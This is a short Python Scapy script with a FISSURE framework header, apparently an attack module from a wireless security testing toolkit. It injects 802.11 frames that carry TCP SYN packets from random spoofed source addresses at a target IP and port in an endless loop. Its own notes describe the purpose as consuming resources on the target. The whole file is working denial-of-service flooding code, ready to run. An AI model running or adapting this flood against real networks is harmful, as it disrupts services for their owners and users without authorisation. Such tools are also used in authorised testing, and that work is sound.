from scapy.all import IP,TCP,LLC,SNAP,RandIP,Raw,RandShort,RadioTap,Dot11,sendp
import socket
import time
import sys

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    source_mac = "AA:BB:CC:DD:EE:FF"
    dest_mac = "11:22:33:44:55:66"
    tcp_dest_ip = "192.168.1.10"
    tcp_dest_port = 80
    iface = ''
    interval = .1
    notes = 'Transmits Scapy TCP SYN messages with random source IP addresses to consume resources on the target.'
    arg_names = ['source_mac','dest_mac','tcp_dest_ip','tcp_dest_port','iface','interval','notes']
    arg_values = [source_mac, dest_mac, tcp_dest_ip, tcp_dest_port, iface, interval, notes]

    return (arg_names,arg_values)


if __name__ == "__main__":

    # Default Values
    get_source_mac = "AA:BB:CC:DD:EE:FF"
    get_dest_mac = "11:22:33:44:55:66"
    get_tcp_dest_ip = "192.168.1.10"
    get_tcp_dest_port = 80
    get_iface = ''
    get_interval = .01
    notes = ''

    # Accept Command Line Arguments
    try:
        get_source_mac = sys.argv[1]
        get_dest_mac = sys.argv[2]
        get_tcp_dest_ip = sys.argv[3]
        get_tcp_dest_port = int(sys.argv[4])
        get_iface = sys.argv[5]
        get_interval = float(sys.argv[6])
        notes = sys.argv[7]
    except:
        pass

#################################################

    # LLC/SNAP/IP
    dot11_bytes = RadioTap()/Dot11(type=2, subtype=0, addr1=get_dest_mac, addr2=get_source_mac, addr3=get_source_mac)/LLC()/SNAP()/IP()
    dot11_bytes[IP].src = RandIP()  #RandIP("192.168.1.1/24")
    dot11_bytes[IP].dst = get_tcp_dest_ip
    dot11_bytes[IP].id = 0x0000
    dot11_bytes[IP].flags = 2
    
    # Optional Raw TCP Data
    tcp_data = Raw(b"X"*1024)

    while True:
        # Make TCP
        tcp_bytes = TCP(sport=RandShort(), dport=get_tcp_dest_port, flags="S")
        
        # Assemble
        final_bytes = str(dot11_bytes/tcp_bytes/tcp_data)
        
        # Send
        sendp(final_bytes, iface=get_iface, loop=0)
        time.sleep(get_interval)
